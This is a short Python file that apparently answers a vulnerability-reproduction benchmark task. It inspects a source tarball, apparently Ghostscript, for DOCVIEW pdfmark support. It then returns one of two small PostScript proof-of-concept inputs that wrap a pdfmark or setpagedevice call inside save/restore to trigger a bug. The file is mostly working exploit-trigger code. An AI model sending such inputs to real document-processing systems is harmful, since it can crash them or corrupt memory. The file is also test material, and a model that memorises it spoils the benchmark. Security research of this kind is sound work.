import os
import tarfile
from typing import Iterable, Optional


def _stream_contains(fileobj, needles: Iterable[bytes], chunk_size: int = 1 << 16) -> bool:
    needles = [n for n in needles if n]
    if not needles:
        return False
    max_len = max(len(n) for n in needles)
    tail = b""
    while True:
        chunk = fileobj.read(chunk_size)
        if not chunk:
            return False
        data = tail + chunk
        for n in needles:
            if n in data:
                return True
        if max_len > 1:
            tail = data[-(max_len - 1):]
        else:
            tail = b""


def _tarball_has_any(src_path: str, needles: Iterable[bytes]) -> bool:
    if not src_path or not os.path.exists(src_path):
        return False
    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf:
                if not m or not m.isfile():
                    continue
                name = (m.name or "").lower()
                if not (name.endswith(".c") or name.endswith(".h") or name.endswith(".cc") or name.endswith(".cpp") or name.endswith(".cxx")):
                    continue
                if "pdf" not in name and "gdev" not in name and "device" not in name:
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                with f:
                    if _stream_contains(f, needles):
                        return True
    except Exception:
        return False
    return False


def _poc_docview() -> bytes:
    return (
        b"%!PS\n"
        b"/s0 save def\n"
        b"[ /PageMode /UseOutlines /DOCVIEW pdfmark\n"
        b"s0 restore\n"
        b"newpath 0 0 moveto 1 1 lineto stroke\n"
        b"showpage\n"
        b"%%EOF\n"
    )


def _poc_setpagedevice() -> bytes:
    return (
        b"%!PS\n"
        b"/s0 save def\n"
        b"<< /PageSize [612 792] >> setpagedevice\n"
        b"s0 restore\n"
        b"newpath 0 0 moveto 1 1 lineto stroke\n"
        b"showpage\n"
        b"%%EOF\n"
    )


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Heuristic: if DOCVIEW pdfmark support is present, use the DOCVIEW-based trigger.
        if _tarball_has_any(src_path, [b"DOCVIEW", b"docview", b"restore_viewer", b"viewer_state_depth", b"viewer depth"]):
            return _poc_docview()
        return _poc_setpagedevice()